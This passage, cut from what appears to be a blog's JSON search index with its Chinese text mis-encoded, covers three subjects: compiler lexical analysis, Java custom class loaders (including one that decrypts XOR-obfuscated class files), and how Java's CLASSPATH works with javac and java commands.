è¯æ³•åˆ†æç¨‹åºè¿™æ—¶å¯ä»¥å†å¯¹æ‰«æç¼“å†²åŒºè¿›è¡Œæ‰«æ è¶…å‰æœç´¢ ä¸€èˆ¬é«˜çº§è¯­è¨€ä¸å¿…è¶…å‰æœç´¢\nä½†æœ‰äº›å¯¹å…³é”®å­—ä¸åŠ ä¿æŠ¤çš„è¯­è¨€ï¼Œå•è¯é—´æ²¡æœ‰æ˜ç¡®ç•Œç¬¦ï¼Œè¦åœ¨ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è¯†åˆ«å•è¯ï¼Œè¿™æ—¶éœ€è¦è¶…å‰æœç´¢ã€‚\nè¯æ³•åˆ†æç¨‹åºè¾“å‡ºæ ¼å¼ äºŒå…ƒå¼ï¼ˆç±»å·ï¼Œå†…ç ï¼‰ï¼šæ¯ä¸ªå•è¯å¯¹åº”ä¸€ä¸ªäºŒå…ƒå¼ã€‚å…¶ä¸­ç±»å·ç”¨æ•´æ•°è¡¨ç¤ºï¼Œç±»å·æ—¢å¯åŒºåˆ†å•è¯ç§ç±»ï¼Œåˆå¯ä¾¿äºç¨‹åºå¤„ç†ã€‚\nç±»å·ç”¨äºåŒºåˆ†å•è¯çš„ç§ç±»ï¼Œè€ƒè™‘çš„åŸåˆ™æ˜¯ï¼š\næ¯ä¸ªåŸºæœ¬å­—å æœ‰ä¸€ä¸ªç±»å·ï¼Œå†…ç ç¼ºçœï¼› å„ç§æ ‡è¯†ç¬¦ç»Ÿä¸€ä¸ºä¸€ç±»ï¼Œç”±å†…ç æ¥åŒºåˆ†ä¸åŒçš„æ ‡è¯†ç¬¦åã€‚é€šå¸¸å°†å„æ ‡è¯†ç¬¦çš„ç¬¦å·è¡¨å…¥å£åœ°å€ä½œä¸ºå…¶å†…ç ã€‚ å¯¹äºå¸¸é‡ï¼Œä»¥å¸¸é‡çš„æ•°æ®ç±»å‹åŒºåˆ†ä¸åŒç±»å·ï¼Œå¯¹æ¯ç±»è®¾ç½®ç›¸åº”å¸¸é‡è¡¨ã€‚å„å¸¸é‡åœ¨å…¶å¸¸é‡è¡¨ä¸­çš„å…¥å£åœ°å€ä½œä¸ºå…¶å†…ç ã€‚ å¯¹äºç•Œç¬¦ï¼Œé€šå¸¸ä¸€ä¸ªç¬¦å·ä¸€ä¸ªç±»å·ï¼Œå†…ç ç¼ºçœï¼Œ å•è¯åˆ†ç±» ä»¥Cè¯­è¨€ä¸ºä¾‹\nåŸºæœ¬å­—ï¼ˆå…³é”®å­—ã€ä¿ç•™å­—ï¼‰\næ ‡è¯†ç¬¦ï¼šå˜é‡åã€æ•°ç»„åã€å‡½æ•°åã€è¿‡ç¨‹å\nå¸¸é‡\nè¿ç®—ç¬¦\nè¾¹ç•Œç¬¦ï¼ˆç•Œç¬¦ï¼‰ï¼š. , ; ( ) : {}ç­‰ï¼Œæœ‰æ—¶æŠŠè¿ç®—ç¬¦å½“åšè¾¹ç•Œç¬¦\nè¯æ³•åˆ†æç¨‹åºè®¾è®¡æ–¹æ³• å†™å‡ºè¯¥è¯­è¨€çš„è¯æ³•è§„åˆ™ã€‚ æŠŠè¯æ³•è§„åˆ™è½¬æ¢ä¸ºç›¸åº”çš„çŠ¶æ€è½¬æ¢å›¾ï¼Œ æŠŠå„è½¬æ¢å›¾çš„åˆæ€è¿åœ¨ä¸€èµ·ï¼Œæ„æˆè¯†åˆ«è¯¥è¯­è¨€çš„è‡ªåŠ¨æœº è®¾è®¡æ‰«æå™¨ æŠŠæ‰«æå™¨ä½œä¸ºè¯­æ³•åˆ†æçš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œå½“è¯­æ³•åˆ†æéœ€è¦ä¸€ä¸ªå•è¯æ—¶ï¼Œå°±è°ƒç”¨æ‰«æå™¨ã€‚ æ‰«æå™¨ä»åˆæ€å‡ºå‘ï¼Œå½“è¯†åˆ«ä¸€ä¸ªå•è¯ä¾¿è¿›å…¥ç»ˆæ€ï¼Œé€å‡ºäºŒå…ƒå¼ã€‚ å¯ä»¥ç”¨çŠ¶æ€çŸ©é˜µä»£æ›¿çŠ¶æ€å›¾ï¼Œä»¥ä¾¿äºè®¡ç®—æœºå¤„ç†ã€‚\nè¯æ³•åˆ†æç¨‹åº=çŠ¶æ€è½¬æ¢å›¾+æ§åˆ¶ç¨‹åº\næ§åˆ¶ç¨‹åºç®€å•ï¼Œå…³é”®æ˜¯æ„é€ çŠ¶æ€è½¬æ¢çŸ©é˜µåŠå…¶ç›¸åº”çš„è¯­ä¹‰åŠ¨ä½œã€‚å¯æ ¹æ®å•è¯çš„æ­£è§„å¼åŠå…¶ç›¸åº”çš„è¯­ä¹‰åŠ¨ä½œè‡ªåŠ¨äº§ç”Ÿè¯æ³•åˆ†æç¨‹åº\n","date":"2024-11-08T17:06:57+08:00","permalink":"https://d4n-sec.github.io/p/lexicalanalysis/","title":"ç¼–è¯‘åŸç†-è¯æ³•åˆ†æ"},{"content":"ç¼–è¯‘ç¨‹åºçš„å·¥ä½œ è¯æ³•åˆ†æ è¯­æ³•åˆ†æ è¯­ä¹‰åˆ†æå’Œä¸­é—´ä»£ç ç”Ÿæˆ ä¼˜åŒ– ç›®æ ‡ä»£ç ç”Ÿæˆ ä¸Šå›¾ä¸­çš„è¯­ä¹‰åˆ†æä¸€èˆ¬æ¥è¯´ä¼šè¢«èåˆè¿›è¯­æ³•åˆ†æä¸­\n","date":"2024-11-08T17:02:31+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241108170335764.png","permalink":"https://d4n-sec.github.io/p/compilationprinciple/","title":"ç¼–è¯‘åŸç†"},{"content":"è‡ªå®šä¹‰ç±»åŠ è½½å™¨çš„ä½¿ç”¨ æ ¹æ®å‰æ–‡ï¼Œä¸ç®¡æ˜¯Bootstrap ClassLoaderè¿˜æ˜¯ExtClassLoaderç­‰ï¼Œè¿™äº›ç±»åŠ è½½å™¨éƒ½åªæ˜¯åŠ è½½æŒ‡å®šçš„ç›®å½•ä¸‹çš„jaråŒ…æˆ–è€…èµ„æºã€‚å¦‚æœåœ¨æŸç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦åŠ¨æ€åŠ è½½ä¸€äº›ä¸œè¥¿å‘¢ï¼Ÿ\næ¯”å¦‚ä»Dç›˜æŸä¸ªæ–‡ä»¶å¤¹åŠ è½½ä¸€ä¸ªclassæ–‡ä»¶ï¼Œè¿™ä¸ªè·¯å¾„æ˜¯è¾“å…¥çš„è€Œéç¨‹åºè¿è¡Œæ—¶é…ç½®å‚æ•°ã€‚\næˆ–è€…ä»ç½‘ç»œä¸Šä¸‹è½½classä¸»å†…å®¹ç„¶åå†è¿›è¡ŒåŠ è½½ï¼Œè¿™æ ·å¯ä»¥å—ï¼Ÿ\nåŒ…çš„ï¼Œé€šè¿‡è‡ªå®šä¹‰ç±»åŠ è½½å™¨å®Œå…¨å¯ä»¥å®ç°ã€‚\næˆ‘ä»¬ä½¿ç”¨ä¸¤ä¸ªæ —å­æ¥æ„Ÿå—è‡ªå®šä¹‰ç±»åŠ è½½å™¨çš„ä½¿ç”¨åœºæ™¯ã€‚\næœ¬åœ°åŠ¨æ€æŒ‡å®šåŠ è½½ç±»è·¯å¾„ å¦‚ä½•è‡ªå®šä¹‰ ç¼–å†™ä¸€ä¸ªç±»ï¼Œç¬”è€…è®¾ç½®ä¸ºDiskClassLoaderï¼Œç»§æ‰¿ ClassLoaderï¼ˆæŠ½è±¡ç±»ï¼‰ é‡å†™ClassLoader.findClass() -\u0026gt; DiskClassLoader.findClass() åœ¨é‡å†™çš„DiskClassLoader.findClass()ä¸­è°ƒç”¨ClassLoader.defineClass()ç”¨ä»¥åŠ è½½ç±» ClassLoader.defineClass()ï¼Œæ­¤æ–¹æ³•åœ¨ç¼–å†™è‡ªå®šä¹‰classLoaderçš„æ—¶å€™å¾ˆé‡è¦ï¼Œä»–çš„ä½œç”¨æ˜¯å°†classå­—èŠ‚ç ä¿¡æ¯è½¬åŒ–ä¸ºClasså¯¹è±¡\næ³¨ï¼šä¸€ä¸ªClassLoaderåˆ›å»ºæ—¶å¦‚æœæ²¡æœ‰æŒ‡å®šparentï¼Œé‚£ä¹ˆå®ƒçš„parenté»˜è®¤ä¸ºAppClassLoaders\nï¼ï¼ï¼æ³¨æ„ä»£ç ä¸­çš„æ³¨é‡Šå–”ï¼ï¼ï¼\næµ‹è¯•ç”¨ä¾‹ Test.java -\u0026gt; D:\\Users\\Dan\\tmp\\Test.java\n1 2 3 4 5 6 7 package com.frank.test; public class Test { public void say(){ System.out.println(\u0026#34;Say Hello\u0026#34;); } } ä½¿ç”¨javaç¼–è¯‘\n1 D:\\Users\\Dan\\tmp\u0026gt;\u0026#34;D:\\Program Files\\Java\\jdk1.8.0_181\\bin\\javac.exe\u0026#34; -d . D:\\Users\\Dan\\tmp\\Test.java æ­¤æ—¶D:\\Users\\Dan\\tmp\\å†…å®¹å¦‚ä¸‹\n1 2 3 4 5 6 ./ â”œâ”€â”€ Test.java â””â”€â”€ com â””â”€â”€ frank â””â”€â”€ test â””â”€â”€ Test.class ç¼–å†™ClassLoader DiskClassLoader æºç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 package com.study.java; import java.io.ByteArrayOutputStream; import java.io.File; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.IOException; public class DiskClassLoader extends ClassLoader { private String mLibPath; public DiskClassLoader(String path) { // TODO Auto-generated constructor stub mLibPath = path; } @Override protected Class\u0026lt;?\u0026gt; findClass(String name) throws ClassNotFoundException { // TODO Auto-generated method stub // æ­¤æ—¶å› ä¸ºè·¯å¾„äººä¸ºæ§åˆ¶ï¼ŒåŒ…åå·²çŸ¥ç­‰æ¡ä»¶ï¼Œè¿™é‡Œç›´æ¥ç¡¬ç¼–ç äº† mLibPath = mLibPath + \u0026#34;\\\\com\\\\frank\\\\test\u0026#34;; String fileName = \u0026#34;Test.class\u0026#34;; File file = new File(mLibPath,fileName); try { FileInputStream is = new FileInputStream(file); ByteArrayOutputStream bos = new ByteArrayOutputStream(); int len = 0; try { while ((len = is.read()) != -1) { bos.write(len); } } catch (IOException e) { e.printStackTrace(); } byte[] data = bos.toByteArray(); is.close(); bos.close(); return defineClass(name,data,0,data.length); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } return super.findClass(name); } } ç¼–å†™æµ‹è¯•å¼€å¯ç±» ClassLoaderTest\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 package com.study.java; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class ClassLoaderTest { public static void main(String[] args) { // TODO Auto-generated method stub //åˆ›å»ºè‡ªå®šä¹‰classloaderå¯¹è±¡ã€‚ DiskClassLoader diskLoader = new DiskClassLoader(\u0026#34;D:\\\\Users\\\\Dan\\\\tmp\u0026#34;); try { //åŠ è½½classæ–‡ä»¶ Class c = diskLoader.loadClass(\u0026#34;com.frank.test.Test\u0026#34;); if(c != null){ try { Object obj = c.newInstance(); Method method = c.getDeclaredMethod(\u0026#34;say\u0026#34;,null); //é€šè¿‡åå°„è°ƒç”¨Testç±»çš„sayæ–¹æ³• method.invoke(obj, null); } catch (InstantiationException | IllegalAccessException | NoSuchMethodException | SecurityException | IllegalArgumentException | InvocationTargetException e) { // TODO Auto-generated catch block e.printStackTrace(); } } } catch (ClassNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); } } } è¿è¡Œæµ‹è¯•å¼€å¯ç±» æˆåŠŸåå°„åˆ°ç›®æ ‡say()å¹¶è¿è¡Œ\nClassLoaderåŠ è½½åŠ å¯†ç±» ï¼ˆå‡è®¾ï¼‰æˆ‘ä»¬çš„Classå­—èŠ‚ç æ–‡ä»¶å¾ˆå€¼é’±ï¼Œä½†æ˜¯å®¹æ˜“è¢«ä¼ æ’­ï¼Œæˆ‘ä»¬åˆæƒ³è¦å®ç°å¿…é¡»è¦ç»™äº†é’±çš„äººæ‰èƒ½è§£å¯†çš„æ–¹æ¡ˆï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥å¯¹æˆ‘ä»¬çš„å­—èŠ‚ç æ–‡ä»¶è¿›è¡ŒåŠ å¯†\næµ‹è¯•ç”¨ä¾‹ å»¶ç»­ä½¿ç”¨ä¸Šæ–¹çš„æµ‹è¯•ç”¨ä¾‹\nå·¥å…·ç±» ç”¨æ¥åŠ å¯†æµ‹è¯•ç”¨ä¾‹ç”Ÿæˆçš„å­—èŠ‚ç æ–‡ä»¶\nFileUtilsï¼Œæºç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package com.study.encode; import java.io.File; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.FileOutputStream; import java.io.IOException; public class FileUtils { public static void test(String path){ File file = new File(path); try { FileInputStream fis = new FileInputStream(file); FileOutputStream fos = new FileOutputStream(path+\u0026#34;en\u0026#34;); int b = 0; int b1 = 0; try { while((b = fis.read()) != -1){ //æ¯ä¸ªbyteéƒ½åŠ å¯† åŠ å¯†å¯†é’¥ä¸ºæ•°å­—2 //å¤„ç†ï¼šæ¯ä¸€ä¸ªbyteå¼‚æˆ–æ•°å­—2 fos.write(b ^ 2); } fos.close(); fis.close(); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } } catch (FileNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); } } } æµ‹è¯•ä¸€ä¸‹\n1 2 3 public static void main(String[] args) { FileUtils.test(\u0026#34;D:\\\\Users\\\\Dan\\\\tmp\\\\com\\\\frank\\\\test\\\\Test.class\u0026#34;); } è¿™æ—¶å€™ç›®å½•ç»“æ„ä¸­å¤šå‡ºäº†ä¸€ä¸ªè¢«åŠ å¯†åçš„å­—èŠ‚ç æ–‡ä»¶ä½ Test.classenï¼Œåˆ é™¤åŸæ¥çš„Test.classå°±å¾—åˆ°äº†\n1 2 3 4 5 6 ./ â”œâ”€â”€ Test.java â””â”€â”€ com â””â”€â”€ frank â””â”€â”€ test â””â”€â”€ Test.classen å¯è§£å¯†çš„ClassLoader DeClassLoaderæºç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 package com.study.encode; import java.io.ByteArrayOutputStream; import java.io.File; import java.io.FileInputStream; import java.io.IOException; public class DeClassLoader extends ClassLoader { private String mLibPath; public DeClassLoader(String path) { // TODO Auto-generated constructor stub mLibPath = path; } @Override protected Class\u0026lt;?\u0026gt; findClass(String name) throws ClassNotFoundException { // TODO Auto-generated method stub String fileName = getFileName(name); File file = new File(mLibPath,fileName); try { FileInputStream is = new FileInputStream(file); ByteArrayOutputStream bos = new ByteArrayOutputStream(); int len = 0; byte b = 0; try { while ((len = is.read()) != -1) { //ï¼ï¼ï¼ï¼ï¼ï¼ï¼ //è§£å¯†è¿‡ç¨‹åœ¨è¿™é‡Œ //å°†æ•°æ®å¼‚æˆ–ä¸€ä¸ªæ•°å­—2ä»¥è¿›è¡Œè§£å¯† b = (byte) (len ^ 2); bos.write(b); } } catch (IOException e) { e.printStackTrace(); } byte[] data = bos.toByteArray(); is.close(); bos.close(); return defineClass(name,data,0,data.length); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } return super.findClass(name); } //è·å–è¦åŠ è½½ çš„classæ–‡ä»¶å private String getFileName(String name) { // TODO Auto-generated method stub int index = name.lastIndexOf(\u0026#39;.\u0026#39;); if(index == -1){ return name+\u0026#34;.classen\u0026#34;; }else{ return name.substring(index+1)+\u0026#34;.classen\u0026#34;; } } } æµ‹è¯•å¼€å¯ç±» Mainæºç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package com.study.encode; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Main { public static void main(String[] args) { DeClassLoader diskLoader = new DeClassLoader(\u0026#34;D:\\\\Users\\\\Dan\\\\tmp\\\\com\\\\frank\\\\test\u0026#34;); try { //åŠ è½½classæ–‡ä»¶ Class c = diskLoader.loadClass(\u0026#34;com.frank.test.Test\u0026#34;); if(c != null){ try { Object obj = c.newInstance(); Method method = c.getDeclaredMethod(\u0026#34;say\u0026#34;,null); //é€šè¿‡åå°„è°ƒç”¨Testç±»çš„sayæ–¹æ³• try { method.invoke(obj, null); } catch (InvocationTargetException e) { throw new RuntimeException(e); } } catch (InstantiationException | IllegalAccessException | NoSuchMethodException | SecurityException | IllegalArgumentException e) { // TODO Auto-generated catch block e.printStackTrace(); } } } catch (ClassNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); } } // public static void main(String[] args) { // FileUtils.test(\u0026#34;D:\\\\Users\\\\Dan\\\\tmp\\\\com\\\\frank\\\\test\\\\Test.class\u0026#34;); // } } è¿è¡Œç»“æœ å°†DeClassLoaderä¸­çš„b = (byte) (len ^ 2);æ³¨é‡Šæ‰ï¼Œå°±å¯ä»¥åˆ é™¤è§£å¯†è¿‡ç¨‹ï¼Œå…¶ä»–ä¸åŠ¨çš„æƒ…å†µä¸‹ï¼Œè§£å¯†è‡ªç„¶å¤±è´¥äº†ï¼Œå¤±è´¥æˆªå›¾å¦‚ä¸‹\nå‚è€ƒ https://blog.csdn.net/briblue/article/details/54973413\n","date":"2024-11-08T11:10:34+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241107144702889.png","permalink":"https://d4n-sec.github.io/p/userdefineclassloader/","title":"Javaè‡ªå®šä¹‰ç±»åŠ è½½å™¨"},{"content":"ClassPathæ˜¯Javaä¸­ä¸€ä¸ªé‡è¦çš„ç¯å¢ƒå˜é‡ï¼Œå¼„æ‡‚ä»–å¯¹äºJavaè¿è¡Œç¯å¢ƒçš„ç†è§£æœ‰é‡å¤§çš„å¸®åŠ©\nClassPathæ˜¯ä»€ä¹ˆ CLASSPATHç›´è¯‘è¿‡æ¥æ˜¯ç±»è·¯å¾„ï¼Œæ˜¯Javaç¯å¢ƒé…ç½®ä¸­è¦è®¾ç½®çš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå°±æ˜¯.classæ–‡ä»¶çš„è·¯å¾„ï¼Œè¡¨ç¤ºJVMä»å“ªé‡Œå»å¯»æ‰¾è¦è¿è¡Œçš„classæ–‡ä»¶ï¼ŒCLASSPATH = D:\\javaè¡¨ç¤ºæ‰§è¡Œjavaå‘½ä»¤æ—¶å»D:\\javaç›®å½•ä¸­å»æ‰¾éœ€è¦è¢«æ‰§è¡Œçš„classæ–‡ä»¶å¹¶è¿è¡Œã€‚\nä½“éªŒpackage å…ˆæ¥ä½“éªŒä¸€ä¸ªæ­£å¸¸çš„Javaé¡¹ç›®ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹\n1 2 3 4 5 6 7 ./ â””â”€â”€ com â””â”€â”€ study â”œâ”€â”€ java â”‚Â â”œâ”€â”€ MainTest.java â””â”€â”€ school â””â”€â”€ Student.java Student.javaå†…å®¹å¦‚ä¸‹\n1 2 3 4 5 6 7 package com.study.school; public class Student { public void study() { System.out.println(\u0026#34;I\u0026#39;m studying...\u0026#34;); } } MainTest.javaå†…å®¹å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 package com.study.java; import com.study.school.Student; public class MainTest { public static void main(String[] args) { Student s = new Student(); s.study(); } } è¿è¡ŒMainTest.javaä¸­çš„main()ï¼Œå¯ä»¥å¾—åˆ°\næ­£å¸¸è°ƒç”¨\nå¯ä»¥çœ‹åˆ°ï¼Œä¸¤ä¸ªJavaç±»å¤„äºä¸åŒçš„ç›®å½•ï¼Œä¹Ÿèƒ½æ­£å¸¸è°ƒç”¨ï¼Œå‰ææ˜¯MainTest.javaè¯†åˆ«åˆ°äº†Student.javaçš„åŒ…è·¯å¾„ï¼Œå‡†ç¡®importäº†com.study.school.Studentï¼Œè¿™ä¸ªåŒ…è·¯å¾„æ˜¯packageå®šä¹‰çš„ï¼\nä½“éªŒClassPath é¦–å…ˆæˆ‘ä»¬æ•´ä¸ªç›®å½•ç»“æ„å¦‚ä¸‹\n1 2 ./ â”œâ”€â”€ MainTest.java æˆ‘ä»¬å…ˆå…³æ³¨MainTest.javaï¼Œçœ‹çœ‹ä»–çš„å†…å®¹\n1 2 3 4 5 public class MainTest { public static void main(String[] args){ System.out.println(\u0026#34;hello-hi\u0026#34;); } } å¾ˆç®€å•ï¼Œåªæ˜¯ä¸€å¥è¾“å‡ºï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆæ‰§è¡Œjavacå‘½ä»¤ï¼Œå°†ä»–ç¼–è¯‘ä¸ºå­—èŠ‚ç æ–‡ä»¶ï¼Œå†ä½¿ç”¨javaå‘½ä»¤å»æ‰§è¡Œä»–\n1 2 3 4 5 6 7 8 9 C:\\Users\\Dan\\Desktop\\pppppp\u0026gt;\u0026#34;D:\\Program Files\\Java\\jdk1.8.0_181\\bin\\javac.exe\u0026#34; MainTest.java # æ­¤æ—¶äº§ç”Ÿäº† MainTest.class åœ¨ MainTest.java åŒçº§è·¯å¾„ä¸‹ï¼Œå¦‚ä¸‹ï¼Œ # ./ # â”œâ”€â”€ MainTest.class # é»˜è®¤å’Œ.javaæ–‡ä»¶åŒè·¯å¾„ # â”œâ”€â”€ MainTest.java # æº.javaæ–‡ä»¶ C:\\Users\\Dan\\Desktop\\pppppp\u0026gt;\u0026#34;D:\\Program Files\\Java\\jdk1.8.0_181\\bin\\java.exe\u0026#34; MainTest hello-hi # ç¬¦åˆé¢„æœŸ ç›®å‰ä¸ºæ­¢æ‰€æœ‰çš„è¾“å‡ºéƒ½ç¬¦åˆé¢„æœŸã€‚\nä½†åŒæ—¶æˆ‘ä»¬ä¹Ÿç†è§£ï¼Œä¸€ä¸ªå¤§å‹çš„ï¼Œæˆ–è€…å¯æ‹“å±•æ€§å¼ºçš„Javaé¡¹ç›®ï¼Œæ˜¯æŒ‰ç…§æ¨¡å—åŒ–æ€ç»´æ¥è¿›è¡Œå¼€å‘çš„ï¼Œæ‰€ä»¥ä¸åŒçš„åŠŸèƒ½ä¼šäº¤ç»™ä¸åŒçš„åŒ…æ¥æ‰§è¡Œï¼ŒJavaæä¾›äº†packageå…³é”®å­—æ¥åšåˆ°è¿™ç‚¹ã€‚æ­£å¦‚ä¸Šé¢çš„æ¡ˆä¾‹ä¸€æ ·\nä¸ºäº†æ¨¡æ‹Ÿé¡¹ç›®ç¯å¢ƒï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ç›®å½•ç»“æ„ä»¥åŠ.javaçš„å†…å®¹\n1 2 3 4 5 ./ â”œâ”€â”€ MainTest.java â”œâ”€â”€ bin â””â”€â”€ src â””â”€â”€ MainTestClassPath.java é‚£æˆ‘ä»¬ç¨å¾®ä¿®æ”¹ä¸€ä¸‹MainTest.javaï¼Œè®©ä»–å¤„äºåŒ…ç¯å¢ƒå†…ï¼Œå˜æˆMainTestClassPath.javaï¼Œåªæ·»åŠ äº†packageå…³é”®å­—ä»¥åŠåŒ…è·¯å¾„\nMainTestClassPath.javaå†…å®¹å¦‚ä¸‹\n1 2 3 4 5 6 7 package com.study.java; public class MainTestClassPath { public static void main(String[] args){ System.out.println(\u0026#34;hello-hi\u0026#34;); } } æ­¤æ—¶æˆ‘ä»¬å†æ‰§è¡Œjavacå‘½ä»¤ï¼Œå°†ä»–ç¼–è¯‘ä¸ºå­—èŠ‚ç æ–‡ä»¶ï¼Œå†ä½¿ç”¨javaå‘½ä»¤å»æ‰§è¡Œä»–\n1 2 3 4 5 6 7 8 9 10 11 C:\\Users\\Dan\\Desktop\\pppppp\u0026gt;javac.exe .\\src\\MainTestClassPath.java # æ­¤æ—¶äº§ç”Ÿäº† MainTestClassPath.class åœ¨ MainTestClassPatht.java åŒçº§è·¯å¾„ä¸‹ï¼Œå¦‚ä¸‹æ˜¯å½“å‰çš„ç›®å½•ç»“æ„ï¼Œ # ./ # â”œâ”€â”€ MainTest.java # â”œâ”€â”€ bin # â””â”€â”€ src # â”œâ”€â”€ MainTestClassPath.class # â””â”€â”€ MainTestClassPath.java C:\\Users\\Dan\\Desktop\\pppppp\u0026gt;java.exe .\\src\\MainTestClassPath é”™è¯¯: æ‰¾ä¸åˆ°æˆ–æ— æ³•åŠ è½½ä¸»ç±» C:\\Users\\Dan\\Desktop\\pppppp\\src\\MainTestClassPath æŠ¥é”™äº†ï¼Œä¸ºä»€ä¹ˆï¼ŸåŸå› å¾ˆæ¸…æ¥šçš„å‘ŠçŸ¥äº†æˆ‘ä»¬ï¼Œæ²¡æœ‰æ‰¾åˆ°æˆ–è€…æ— æ³•åŠ è½½ä¸»ç±»ï¼Œä½†æ˜¯æˆ‘ä»¬è¿è¡Œçš„ç±»å¾ˆç®€å•ï¼Œä¸åº”è¯¥å‡ºç°ç±»å±‚é¢çš„é—®é¢˜ï¼Œå”¯ä¸€å‡ºç°çš„é—®é¢˜ï¼Œå°±æ˜¯æ·»åŠ äº†packageå…³é”®å­—ã€‚\næ²¡æœ‰æ‰¾åˆ°ç±»ï¼Œæ˜¯å› ä¸ºClassLoaderæŸ¥æ‰¾å¤±è´¥äº†\nè¿™äº›é—®é¢˜æ˜¯æ€ä¹ˆå½¢æˆçš„ï¼Œæš‚æ—¶æŒ‰ä¸‹ä¸è¡¨ï¼Œè‡³äºå¦‚ä½•ä¿®å¤ï¼Œæˆ–è€…è¯´å¦‚ä½•æ­£ç¡®è°ƒç”¨å‘¢ï¼Ÿ\nè§£å†³ æ­¥éª¤åº”è¯¥å¦‚ä¸‹\nç›®å½•ç»“æ„æ²¡æœ‰å˜åŒ–\n1 2 3 4 ./ â”œâ”€â”€ bin â””â”€â”€ src â””â”€â”€ MainTestClassPath.java MainTestClassPath.javaå†…å®¹ä¹Ÿä¸å˜\n1 2 3 4 5 6 7 package com.study.java; public class MainTestClassPath { public static void main(String[] args){ System.out.println(\u0026#34;hello-hi\u0026#34;); } } æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 C:\\Users\\Dan\\Desktop\\pppppp\u0026gt;javac.exe .\\src\\MainTestClassPath.java -d bin # æ‰§è¡Œå®Œæ­¤å‘½ä»¤åï¼Œç›®å½•ç»“æ„å¦‚ä¸‹ # ./ # â”œâ”€â”€ MainTest.java # â”œâ”€â”€ bin # â”‚Â â””â”€â”€ com # â”‚Â â””â”€â”€ study # â”‚Â â””â”€â”€ java # â”‚Â â””â”€â”€ MainTestClassPath.class # â””â”€â”€ src # â””â”€â”€ MainTestClassPath.java C:\\Users\\Dan\\Desktop\\pppppp\u0026gt;java.exe -classpath bin com.study.java.MainTestClassPath # æˆåŠŸ hello-hi # ä¹Ÿå¯ä»¥ C:\\Users\\Dan\\Desktop\\pppppp\u0026gt;cd bin C:\\Users\\Dan\\Desktop\\pppppp\\bin\u0026gt;java.exe com.study.java.MainTestClassPath #æˆåŠŸ hello-hi æˆåŠŸæ‰§è¡Œäº†ï¼Œä¸ºä»€ä¹ˆï¼Œä¸åŒçš„ç‚¹åœ¨äºä½¿ç”¨äº† -d å‚æ•°ï¼Œ-dæŒ‡å®šäº†ç”Ÿæˆç›®å½•ï¼Œåœ¨binç›®å½•ä¸‹ç”Ÿæˆã€‚\nè¿™ä¸ªæ—¶å€™javacè‡ªåŠ¨åˆ›å»ºäº†å¤šçº§ç›®å½•ï¼ŒæŒ‰ç…§packageçš„.å·ä½œä¸ºç›®å½•åˆ’åˆ†ç¬¦ï¼Œå°†åˆ›å»ºå¥½çš„MainTestClassPath.classæ”¾åœ¨äº†ç›®å½•æœ€æ·±å¤„\nç„¶åä½¿ç”¨javaå‘½ä»¤ï¼ŒæŒ‡å®šclasspathä¸ºbinç›®å½•ï¼Œæ‰§è¡Œcom.study.java.MainTestClassPathç±»æ—¶ï¼ŒClassLoaderä¼šåœ¨binç›®å½•ä¸‹å¯»æ‰¾com.study.java.MainTestClassPathç±»ï¼Œå¹¶ä¸”å°†.ä½œä¸ºç›®å½•åˆ†éš”ç¬¦ï¼Œè¿›å…¥ç›®å½•æŸ¥æ‰¾ç±»ï¼Œæ­¤æ—¶å°±æ‰¾åˆ°äº†\nå¦‚æœè¿è¡Œjavaå‘½ä»¤æ—¶ï¼Œä¸æŒ‡å®šClassPathå‚æ•°ï¼Œéœ€è¦å…ˆè¿›å…¥binç›®å½•ï¼Œå†æ‰§è¡Œjava.exe com.study.java.MainTestClassPathï¼Œè¿™æ ·javaé™¤äº†é»˜è®¤æŸ¥æ‰¾è·¯å¾„å¤–ï¼ˆè¿™äº›é»˜è®¤è·¯å¾„å’Œé¡¹ç›®æ–‡ä»¶æ— å…³ï¼‰ï¼Œä¹Ÿä¼šæŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹æœ‰æ²¡æœ‰com.study.java.MainTestClassPathç±»ï¼ŒåŒæ 